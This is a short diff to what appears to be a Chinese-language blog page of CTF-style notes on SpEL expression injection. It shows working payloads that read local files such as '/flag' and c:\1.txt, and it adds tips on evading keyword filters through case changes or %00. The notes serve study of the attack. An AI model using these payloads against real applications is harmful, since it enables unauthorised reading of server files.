@@ -182,8 +182,11 @@ SPEL也支持</p>
 读文件<br>
 <code>#{new java.util.Scanner(new java.io.File(&quot;c:\\1.txt&quot;)).next()}</code><br>
 <code>#{T(org.apache.commons.io.FileUtils).readFileToString(new java.io.File(&quot;c:\\1.txt&quot;))}</code><br>
+<code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()</code><br>
 利用FileUtils这个包。不是自带的<br>
-其他bypass的。可以看<br>
+当遇到过滤关键字的时候。可以利用大小写。%00等骚姿势绕过<br>
+在SPEL中。关键字不区分大小写。比如new/NEW</p>
+<p>其他bypass的。可以看<br>
 <code>https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</code><br>
 先占个坑。</p>
 
